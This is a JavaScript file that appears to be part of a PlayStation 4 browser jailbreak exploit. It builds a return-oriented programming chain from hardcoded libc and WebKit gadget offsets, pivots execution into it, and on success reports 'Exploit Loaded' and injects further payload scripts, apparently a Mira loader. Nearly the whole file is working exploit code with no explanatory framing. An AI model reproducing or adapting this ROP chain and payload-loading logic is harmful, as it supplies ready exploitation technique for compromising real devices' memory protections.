function jailbreak(){
var ropchain_array = new Uint32Array(150448);
var ropchain = read_ptr_at(addrof(ropchain_array)+0x10);
var ropchain_offset = 2;
function set_gadget(val){ropchain_array[ropchain_offset++] = val | 0;ropchain_array[ropchain_offset++] = (val / 4294967296) | 0;}
function set_gadgets(l){for(var i = 0; i < l.length; i++)set_gadget(l[i]);}
function db(data){for(var i = 0; i < data.length; i++)ropchain_array[ropchain_offset++] = data[i];}
var main_ret = malloc(8);
var printf_buf = malloc(65536);
var __swbuf_addr = 0;set_gadgets([libc_base+788575,ropchain+65720,webkit_base+14461559,libc_base+206806,ropchain+65680,libc_base+793877]);db([8,0]);set_gadgets([libc_base+248252,libc_base+788575,ropchain+112,libc_base+471355,libc_base+811575,ropchain+419752,libc_base+811575,ropchain+65680]);
var printf_buf_offset = 128;set_gadget(printf_buf);db([4294967295,4294967295]);
pivot(ropchain);
var main_ret = read_ptr_at(main_ret);
var printf_buf_end = read_ptr_at(ropchain+printf_buf_offset);
var printf_ans = read_mem_as_string(printf_buf,printf_buf_end-printf_buf);
var _ = malloc_nogc.pop();
var _ = malloc_nogc.pop();
var _ = malloc_nogc.pop();

if (main_ret == 179 || main_ret == 0) {
  window.msgs.innerHTML="Exploit Loaded ✔<br>Now Load A Payload";

if (ExploitMira != null){
  window.msgs.innerHTML="Exploit Loaded,<br>Now Loading "+PlName;
    setTimeout(function(){
    var script = document.createElement('script');script.src = MiraSRC;document.body.appendChild(script);
    var script = document.createElement('script');script.src = LoaderVer;document.body.appendChild(script);
    },1000);
  }
} 
else {
  window.msgs.innerHTML="Jailbreak failed!<br>Reboot your PS4";
}

}